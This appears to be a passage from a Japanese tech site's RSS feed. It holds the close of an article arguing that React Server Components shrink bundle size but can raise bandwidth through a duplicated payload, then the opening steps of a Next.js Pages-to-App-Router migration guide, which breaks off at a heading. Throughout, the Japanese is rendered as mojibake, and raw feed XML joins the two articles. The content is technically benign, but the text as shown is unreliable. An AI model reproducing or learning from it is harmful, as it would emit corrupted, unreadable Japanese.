<p>ä¾‹ãˆã°ã€Next.jsã®ä¸–ç•Œã§ã¯RSCã®ãƒ¡ãƒªãƒƒãƒˆã«ã¤ã„ã¦ä»¥å‰ã‹ã‚‰èª¤è§£ãŒã‚ã‚Šã¾ã—ãŸã€‚<code class="language-text">__next_f()</code>é–¢æ•°ã«ã¤ã„ã¦ã€Next.jsã‚³ãƒ¼ãƒ‰ã®ãƒªãƒã‚¸ãƒˆãƒªã§ã¯<a href="https://github.com/vercel/next.js/discussions/42170">ç´ æ™´ã‚‰ã—ã„è­°è«–</a>ãŒç¹°ã‚Šåºƒã’ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚</p>
<p>RSCã‚’ä½¿ã„å§‹ã‚ãŸãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã¯ã€ãƒšãƒ¼ã‚¸ä¸‹éƒ¨ã®<code class="language-text">script</code>ã‚¿ã‚°ã§ã“ã®é–¢æ•°ã«é‡è¤‡ãƒ‡ãƒ¼ã‚¿ãŒæ¸¡ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã«æ°—ã¥ãã¾ã—ãŸã€‚ãªãœãã“ã«ã“ã®é–¢æ•°ãŒã‚ã‚‹ã®ã‹ç–‘å•ã«æ„Ÿã˜ã€ç„¡åŠ¹ã«ã§ããªã„ã‹å°‹ã­ã‚‹ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã‚‚ã„ã¾ã—ãŸã€‚</p>
<p>ã“ã®é‡è¤‡ãƒ‡ãƒ¼ã‚¿ã¯ä½•ã§ã—ã‚‡ã†ã‹ã€‚ãã†ã€Payloadã§ã™ã€‚ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã•ã‚Œã¦ããŸé–¢æ•°ã‚³ãƒ¼ãƒ«ã¯ã€ä»®æƒ³DOMã‚’ä½œæˆã™ã‚‹ãŸã‚ã€æœ€çµ‚çš„ã«ãã®Payloadãƒ‡ãƒ¼ã‚¿ã‚’Reactã«æ¸¡ã—ã¾ã™ã€‚ä»•çµ„ã¿ã‚’ç†è§£ã—ã¦ã„ãªã‘ã‚Œã°ã€ã“ã‚Œã¯ã‹ãªã‚Šã‚·ãƒ§ãƒƒã‚­ãƒ³ã‚°ãªã“ã¨ã§ã—ã‚‡ã†ã€‚</p>
<p>å•é¡Œã¯å¸¯åŸŸå¹…ã®ä½¿ç”¨é‡ãŒå¢—ãˆã‚‹ã“ã¨ã§ã‚ã‚Šã€å¤šãã®ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãŒãã®ç‚¹ã«ã¤ã„ã¦ä¸æº€ã‚’è¿°ã¹ã¦ã„ã¾ã—ãŸã€‚ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚’ä»‹ã—ã¦é€ã‚‹ãƒ‡ãƒ¼ã‚¿é‡ãŒå¢—ãˆã¦ã„ã‚‹ã®ã§ã™ã€‚</p>
<p>ãªãœãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼é”ã¯é©šã„ãŸã®ã§ã—ã‚‡ã†ã‹ã€‚å½“åˆã€Vercelã¯Next.jsã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã‚µã‚¤ãƒˆã§RSCã«ã¤ã„ã¦æ¬¡ã®ã‚ˆã†ã«èª¬æ˜ã—ã¦ã„ã¾ã—ãŸã€‚</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/vercel_orig.jpeg"></p>
<p><em>ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºï¼šServer Componentsã§ã¯ã€ä»¥å‰ãªã‚‰ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆJavaScriptã®ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºã«å½±éŸ¿ã™ã‚‹ã‚ˆã†ãªå¤§ããªä¾å­˜é–¢ä¿‚ã‚’ã‚µãƒ¼ãƒãƒ¼ä¸Šã«æ®‹ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯Server Componentsã®JavaScriptã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦è§£æã—ã€å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒä¸€åˆ‡ãªã„ãŸã‚ã€ã“ã‚Œã¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã®é€šä¿¡é€Ÿåº¦ãŒé…ã„ã€ã‚ã‚‹ã„ã¯ãƒ‡ãƒã‚¤ã‚¹ã®å‡¦ç†èƒ½åŠ›ãŒä½ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¨ã£ã¦æœ‰ç›Šã§ã™ã€‚</em></p>
<p>ã€Œã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯Server Componentsã®JavaScriptã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦è§£æã—ã€å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒä¸€åˆ‡ãªã„ã€ã¨ã„ã†æ–‡è¨€ãŒèª¤è§£ã‚’æ‹›ã„ãŸã‚ˆã†ã§ã™ã€‚ã“ã‚Œã¯å®Ÿéš›ã«ã¯æ­£ã—ãã‚ã‚Šã¾ã›ã‚“ã€‚Vercelã¯Server Componentsã®å®Ÿéš›ã®JavaScriptã‚³ãƒ¼ãƒ‰ã«ã¤ã„ã¦è¨€ã£ã¦ã„ãŸã®ã§ã™ãŒã€ã€Œä¸€åˆ‡ã€ã¨ã„ã†è¨€è‘‰ã‚’ä½¿ã£ã¦ã—ã¾ã„ã¾ã—ãŸã€‚</p>
<p>ç­†è€…ã¯ã“ã‚Œã«é–¢é€£ã—ã€Vercelã¨SNSä¸Šã§<a href="https://x.com/joshcstory/status/1766547542194409664">èˆˆå‘³æ·±ã„ä¼šè©±</a>ã‚’ã—ã¾ã—ãŸã€‚ã“ã®ä¼šè©±ãŒã€å¾Œæ—¥æ–‡è¨€ãŒå¤‰æ›´ã•ã‚Œã‚‹ãã£ã‹ã‘ã«ãªã£ãŸã®ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼ˆæ–‡è¨€ã‚’å¤‰æ›´ã—ãŸVercelã«æ„Ÿè¬ï¼‰ã€‚</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/vercel_updated.jpeg"></p>
<p><em>ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ï¼šServer Componentsã¯ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’ãƒ™ãƒ¼ã‚¹ãƒ©ã‚¤ãƒ³ã‹ã‚‰æœ€é©åŒ–ã™ã‚‹æ‰‹æ®µã‚’æä¾›ã—ã¾ã™ã€‚ä¾‹ãˆã°ã€Client Componentã ã‘ã§æ§‹æˆã•ã‚Œã‚‹ã‚¢ãƒ—ãƒªã‹ã‚‰å§‹ã‚ãŸå ´åˆã€UIã®éã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–è¦ç´ ã‚’Server Componentsã«ç§»å‹•ã™ã‚‹ã“ã¨ã§ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ãŒå¿…è¦ãªJavaScriptã®é‡ã‚’æ¸›ã‚‰ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦è§£æã—ã€å®Ÿè¡Œã™ã‚‹ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´JavaScriptã®é‡ãŒæ¸›ã‚‹ãŸã‚ã€ã“ã‚Œã¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã®é€šä¿¡é€Ÿåº¦ãŒé…ã„ã€ã‚ã‚‹ã„ã¯ãƒ‡ãƒã‚¤ã‚¹ã®å‡¦ç†èƒ½åŠ›ãŒä½ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¨ã£ã¦æœ‰ç›Šã§ã™ã€‚</em></p>
<p>æ–°ã—ã„èª¬æ˜ã«ã¯ã€Server ComponentsãŒã€Œã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ãŒå¿…è¦ãªJavaScriptã®é‡ã‚’æ¸›ã‚‰ã™ã“ã¨ãŒã§ãã‚‹ã€ã¨æ›¸ã„ã¦ã‚ã‚Šã¾ã™ã€‚ãã‚Œã¯äº‹å®Ÿã§ã™ã€‚ã—ã‹ã—ã€Payloadã¯ã‚ã‚‹æ„å‘³JavaScriptã€å°‘ãªãã¨ã‚‚ã€JavaScriptã®é–¢æ•°ã«æ¸¡ã•ã‚Œã‚‹ãƒ‡ãƒ¼ã‚¿ãªã®ã§ã€JavaScriptã®é‡ã‚’å¢—ã‚„ã™ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚</p>
<p>ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ãŸã¡ãŒèª¤è§£ã—ã¦ã„ãŸé‡è¦ãªç‚¹ã¯ã€<strong>ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºã¨å¸¯åŸŸå¹…ã®ä½¿ç”¨é‡ã¯åŒã˜ã§ã¯ãªã„ã¨ã„ã†ã“ã¨ã§ã™</strong>ã€‚</p>
<p>Server Componentã®ã‚³ãƒ¼ãƒ‰ã¯ãƒãƒ³ãƒ‰ãƒ«ã«å«ã¾ã‚Œã¦ã„ãªã„ã®ã§ã€ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºã¯å°ã•ããªã‚Šã¾ã™ã€‚ã—ã‹ã—ã€Payloadã®ãƒ‡ãƒ¼ã‚¿ã¯å€å¢—ã—ã¾ã™ã®ã§ã€ãƒ‡ãƒ¼ã‚¿ãŒå¤§ãã„ã¨ï¼ˆã“ã®è¨˜äº‹ã®ã‚ˆã†ãªé•·ç·¨ã®ãƒ–ãƒ­ã‚°è¨˜äº‹ãªã©ï¼‰ç¯€ç´„ã§ãã‚‹ãƒã‚¤ãƒˆæ•°ä»¥ä¸Šã®ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚</p>
<h2>RSCã¯ã„ã¤ä½¿ã†ã¹ãã‹</h2>
<p>ã§ã¯ã€RSCã¯ã„ã¤ä½¿ã†ã¹ããªã®ã§ã—ã‚‡ã†ã‹ã€‚å¤§æŠµã®å ´åˆãã†ã§ã‚ã‚‹ã‚ˆã†ã«ã€ã€ŒçŠ¶æ³æ¬¡ç¬¬ã€ã¨ã„ã†ã®ãŒæ­£ã—ã„ç­”ãˆã§ã™ã€‚RSCã®ä»•çµ„ã¿ã«é–¢ã™ã‚‹æ­£ç¢ºãªãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ãŒæ§‹ç¯‰ã§ãã¦ã„ã‚Œã°ã€é©åˆ‡ãªã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã‚’é¸æŠã§ãã‚‹ã¯ãšã§ã™ã€‚</p>
<p>ç­†è€…ã®å ´åˆã€ã“ã®ã‚ˆã†ãªé•·ç·¨ã®ãƒ–ãƒ­ã‚°è¨˜äº‹ã«ã¯RSCã‚’ä½¿ç”¨ã—ã¾ã›ã‚“ã€‚å¸¯åŸŸå¹…ã®ä½¿ç”¨é‡ãŒå¤šããªã‚Šã€ç†ã«ã‹ãªã‚ãªã„ã‹ã‚‰ã§ã™ã€‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®å¤šã„ã‚µã‚¤ãƒˆã‚„ã‚¢ãƒ—ãƒªã«ã¯ã€<a href="https://astro.build/">Astro</a>ãªã©ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
<p>ä¸€æ–¹ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¤šãã€ãƒ­ã‚¸ãƒƒã‚¯ãŒè¤‡é›‘ãªå ´åˆã€Server Componentã‚’ä½¿ã£ã¦ã‚µãƒ¼ãƒãƒ¼ã«å‡¦ç†ã•ã›ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚å¤§å®¹é‡ã®JavaScriptãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‚’ä½¿ç”¨ã—ã¦æ¯”è¼ƒçš„å°‘é‡ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚‹å ´åˆã‚‚åŒæ§˜ã§ã™ã€‚ãƒãƒ³ãƒ‰ãƒ«ã¨Payloadã®ãƒˆãƒ¬ãƒ¼ãƒ‰ã‚ªãƒ•ãŒä¾¡å€¤ã«è¦‹åˆã†ã‚ˆã†ãªã‚‰ã€RSCã¯ç†ã«ã‹ãªã£ã¦ã„ã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<p>é«˜åº¦ã«ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ãªã‚¢ãƒ—ãƒªã‚’é–‹ç™ºã—ã¦ã„ã¦ã€é »ç¹ã«ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚¢ãƒƒãƒ—ã‚’è¡Œã£ã¦æ©Ÿèƒ½ã‚’è¿½åŠ ã—ã¦ã„ã‚‹ã‚ˆã†ãªå ´åˆã‚‚ã€Client Componentsã‚’ä¸­å¿ƒã«é‹ç”¨ã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¨ã‚µãƒ¼ãƒãƒ¼ä¸¡æ–¹ã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã†ãªãƒªãƒ•ã‚¡ã‚¯ã‚¿ãƒªãƒ³ã‚°ã¯æ¥µåŠ›æ§ãˆã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<p>æ˜ç¢ºãªä½¿ã„æ–¹ã‚’æ¨å¥¨ã™ã‚‹ã«ã¯ä¸ç¢ºå®šè¦ç´ ãŒã‚ã¾ã‚Šã«ã‚‚å¤šã™ãã¾ã™ã€‚ã“ã®è¨˜äº‹ã‚’é€šã˜ã¦è©¦ã¿ãŸã‚ˆã†ã«ã€èª­è€…ãŒæ­£ç¢ºãªæƒ…å ±ã‚’ã‚‚ã¨ã«åˆ¤æ–­ã§ãã‚‹ã‚ˆã†ã€ç†è§£ã‚’æ·±ã‚ã‚‹æ‰‹åŠ©ã‘ã‚’ã™ã‚‹ã®ãŒç­†è€…ã«ã§ãã‚‹ç²¾ä¸€æ¯ã®ã“ã¨ã§ã™ã€‚</p>
<h2>ä»Šå¾Œã®å±•æœ›</h2>
<p>React Server Componentsã®æœªæ¥ã¯ã©ã®ã‚ˆã†ãªã‚‚ã®ã«ãªã‚‹ã§ã—ã‚‡ã†ã‹ã€‚ãã‚Œã¯å¿…ãšã—ã‚‚æ˜ã‚‰ã‹ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚Reactã¯APIã‚’ä½œã‚Šã€ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒãã‚Œã‚’åˆ©ç”¨ã—ã¦ã„ã¾ã™ã€‚</p>
<p>ç­†è€…ã®è€ƒãˆã§ã¯ã€TanStack StartãŒæ¡ç”¨ã—ãŸã€å®Œå…¨ãªServer Componentsã§ã¯ãªãã€ä»®æƒ³DOMã‚’è¿”ã™é–¢æ•°ã‚’ç”¨ã„ã‚‹ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒæ™®åŠã™ã‚‹ã¨æ€ã„ã¾ã™ã€‚ã—ã‹ã—ã€ç”¨é€”ã«ã‚ˆã£ã¦ã¯Next.jsã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚‚æœ‰åŠ¹ã ã¨æ€ã„ã¾ã™ã€‚</p>
<p>ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã¨ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚‚å¾ã€…ã«æ”¹å–„ã—ã¦æ¬²ã—ã„ã¨æ€ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€ä»®æƒ³DOMã®ã‚ã‚‹æãŒå…¨ã¦Server Componentsã®å ´åˆã€å·®åˆ†æ¤œå‡ºå‡¦ç†ã‚„ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’æœ€é©åŒ–ã™ã‚‹ã“ã¨ã§ãã®æã‚’ã‚¹ã‚­ãƒƒãƒ—ã™ã‚‹ã‚ˆã†ã«ã§ãã‚‹ã¨æ€ã„ã¾ã™ã€‚</p>
<h2>ã‚‚ã£ã¨è©³ã—ãå­¦ã³ãŸã„æ–¹ã¸</h2>
<p>ã“ã®è¨˜äº‹ãŒReact Server Componentsã®ç†è§£ã‚’æ·±ã‚ã‚‹ä¸€åŠ©ã«ãªã‚Œã°å¹¸ã„ã§ã™ã€‚Reactã®å…¨ã¦ã«ã¤ã„ã¦ã€ã“ã®ã‚ˆã†ã«ã‚¼ãƒ­ã‹ã‚‰è©³ã—ãå­¦ã³ãŸã„æ–¹ã¯ã€ç­†è€…ã®å®Œå…¨ç‰ˆã€Œ<a href="https://understandingreact.com/">Understanding React</a>ï¼ˆReactã‚’ç†è§£ã™ã‚‹ï¼‰ã€ã‚³ãƒ¼ã‚¹ã«ãœã²ã”ç™»éŒ²ãã ã•ã„ã€‚</p>
<p>27å€‹ã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã¨ã€16.5æ™‚é–“ã®å‹•ç”»ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’é€šã˜ã¦Reactã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è©³ã—ãå­¦ã³ã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã«ã¨ã£ã¦æœ€ã‚‚æœ‰ç›Šãªãƒ„ãƒ¼ãƒ«ã§ã‚ã‚‹æ­£ç¢ºãªãƒ¡ãƒ³ã‚¿ãƒ«ãƒ¢ãƒ‡ãƒ«ã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ãã‚Œã§ã¯ã¾ãŸï¼</p>]]></content:encoded></item><item><title><![CDATA[Next.jsã®Pages Routerã‹ã‚‰App Routerã«ç§»è¡Œã™ã‚‹]]></title><description><![CDATA[Next.jsãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹ Next.jsã®å¾“æ¥ã®Pages Routerã‹ã‚‰æ–°ã—ã„App Routerã«ç§»è¡Œã—ã¾ã—ã‚‡ã†ã€‚ã“ã“ã®ç§»è¡Œã«ã‚ˆã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°åŠ¹ç‡ã¨æŸ”â€¦]]></description><link>https://postd.cc/migrate-from-nextjs-pages-to-app-router/</link><guid isPermaLink="false">https://postd.cc/migrate-from-nextjs-pages-to-app-router/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[Next.js]]></category><pubDate>Thu, 24 Apr 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<h2>Next.jsãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã™ã‚‹</h2>
<p>Next.jsã®å¾“æ¥ã®Pages Routerã‹ã‚‰æ–°ã—ã„App Routerã«ç§»è¡Œã—ã¾ã—ã‚‡ã†ã€‚ã“ã“ã®ç§»è¡Œã«ã‚ˆã‚Šã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°åŠ¹ç‡ã¨æŸ”è»Ÿæ€§ãŒå‘ä¸Šã—ã¾ã™ã€‚App Routerã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãƒ™ãƒ¼ã‚¹ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ©Ÿèƒ½ãŒæ”¹å–„ã•ã‚ŒãŸã»ã‹ã€React Server ComponentsãŒå°å…¥ã•ã‚ŒãŸã“ã¨ãªã©ã«ã‚ˆã‚Šã€é–‹ç™ºä½“é¨“ã‚’å‘ä¸Šã•ã›ã¾ã™ã€‚</p>
<h3>ä¾å­˜é–¢ä¿‚ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹</h3>
<p>package.jsonãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒæœ€æ–°ã§ã‚ã‚‹ã“ã¨ãŒé‡è¦ã§ã™ã€‚ä¾å­˜é–¢ä¿‚ã‚’ã™ã¹ã¦ãƒã‚§ãƒƒã‚¯ã—ã€æ–°ã—ã„App Routerã¨äº’æ›æ€§ãŒã‚ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚å¿…è¦ã§ã‚ã‚Œã°ã‚¢ãƒƒãƒ—ã‚°ãƒ¬ãƒ¼ãƒ‰ã—ã¦ãã ã•ã„ã€‚ã“ã®æº–å‚™ã‚’è¡Œã†ã“ã¨ã§ã€ç§»è¡Œæ™‚ã«äº’æ›æ€§ã®å•é¡ŒãŒç™ºç”Ÿã™ã‚‹ã®ã‚’é¿ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ä¾å­˜é–¢ä¿‚ã¯<code class="language-text">npm</code>ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ç°¡å˜ã«ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ãã ã•ã„ã€‚</p>
<p><code class="language-text">$ npm outdated</code></p>
<h3><code class="language-text">/app</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ä½œæˆã™ã‚‹</h3>
<p>ã¾ãšã¯ã€Next.jsãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ«ãƒ¼ãƒˆã«æ–°ã—ã„<code class="language-text">/app</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ä½œæˆã—ã¾ã—ã‚‡ã†ã€‚App Routerã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ã™ã¹ã¦ã“ã“ã«æ ¼ç´ã•ã‚Œã¾ã™ã€‚</p>
<h3>Pagesãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰Appãƒ•ã‚©ãƒ«ãƒ€ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç§»å‹•ã™ã‚‹</h3>
<p>ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚Œã‚‹HTMLãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã¯ã€<code class="language-text">/pages/_document.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã—ã¾ã™ã€‚App Routerã§ã¯ã€<code class="language-text">/app/layout.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ãŒã“ã®æ©Ÿèƒ½ã‚’æ‹…ã„ã¾ã™ã€‚</p>
<ul>
<li>
<p><code class="language-text">/pages/_document.tsx</code>ã®å†…å®¹ã‚’<code class="language-text">/app/layout.tsx</code>ã¨ã„ã†æ–°ã—ã„ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚</p>
</li>
<li>
<p><code class="language-text">next/document</code>ã®ã‚¤ãƒ³ãƒãƒ¼ãƒˆã‚’å‰Šé™¤ã—ã€<code class="language-text">&lt;Html></code>ã€<code class="language-text">&lt;Head></code>ã€<code class="language-text">&lt;Main /></code>ã®å„ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å¯¾å¿œã™ã‚‹HTMLã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼ˆ<code class="language-text">&lt;html></code>ã€<code class="language-text">&lt;head></code>ã€<code class="language-text">{children}</code>ï¼‰ã«ç½®ãæ›ãˆã¾ã™ã€‚</p>
</li>
<li>
<p><code class="language-text">&lt;NextScript /></code>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å‰Šé™¤ã—ã¾ã™ã€‚</p>
</li>
</ul>
<h3>ãƒšãƒ¼ã‚¸ã‚’App Routerã«ç§»è¡Œã™ã‚‹</h3>
<p><code class="language-text">/pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹å„ãƒšãƒ¼ã‚¸ã«ã¤ã„ã¦ã€å¯¾å¿œã™ã‚‹ãƒ•ã‚©ãƒ«ãƒ€æ§‹é€ ã‚’<code class="language-text">/app</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä½œæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<ul>
<li>
<p>ãƒšãƒ¼ã‚¸ã®URLãƒ‘ã‚¹ã¨ä¸€è‡´ã™ã‚‹ãƒ•ã‚©ãƒ«ãƒ€æ§‹é€ ã‚’<code class="language-text">/app</code>ã«ä½œæˆã—ã¾ã™ã€‚ä¾‹ãˆã°ã€<code class="language-text">/pages/about.tsx</code>ã«ãƒšãƒ¼ã‚¸ãŒã‚ã‚‹å ´åˆã€<code class="language-text">/app/about/page.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚</p>
</li>
<li>
<p><code class="language-text">page.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã«å…ƒã®ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å†…å®¹ã‚’ã‚³ãƒ”ãƒ¼ã—ã¾ã™ã€‚</p>
</li>
<li>
<p>ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®æ©Ÿèƒ½ï¼ˆHooksã€Browser APIãªã©ï¼‰ã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€ãƒ•ã‚¡ã‚¤ãƒ«ã®å…ˆé ­ã«<code class="language-text">use client</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’è¨˜è¿°ã—ã¦ãƒ©ãƒƒãƒ—ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
</li>
</ul>
<h3>ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã‚’ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã™ã‚‹</h3>
<p>App Routerã§ã¯ã€Next.jsã®å¾“æ¥ã®ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒæ–¹æ³•ï¼ˆ<code class="language-text">getStaticProps</code>ã€<code class="language-text">getServerSideProps</code>ã€<code class="language-text">getStaticPaths</code>ï¼‰ã¯ä½¿ç”¨ã•ã‚Œã¾ã›ã‚“ã€‚ãã®ä»£ã‚ã‚Šã€ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆå†…ã§ç›´æ¥ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚§ãƒƒãƒã§ãã¾ã™ã€‚</p>
<ul>
<li>
<p>ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆå†…ã«<code class="language-text">getStaticProps</code>ã€<code class="language-text">getServerSideProps</code>ã€<code class="language-text">getStaticPaths</code>ã®ã„ãšã‚Œã‹ã®é–¢æ•°ãŒã‚ã‚‹å ´åˆã¯å‰Šé™¤ã—ã¾ã™ã€‚</p>
</li>
<li>
<p>JavaScript/TypeScriptã®æ¨™æº–ã®éåŒæœŸé–¢æ•°ã‚’ä½¿ç”¨ã—ã€ãƒšãƒ¼ã‚¸ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆå†…ã§ç›´æ¥ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ•ã‚§ãƒƒãƒã—ã¾ã™ã€‚</p>
</li>
</ul>
<h3>ä¾‹1ï¼šãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒ</h3>
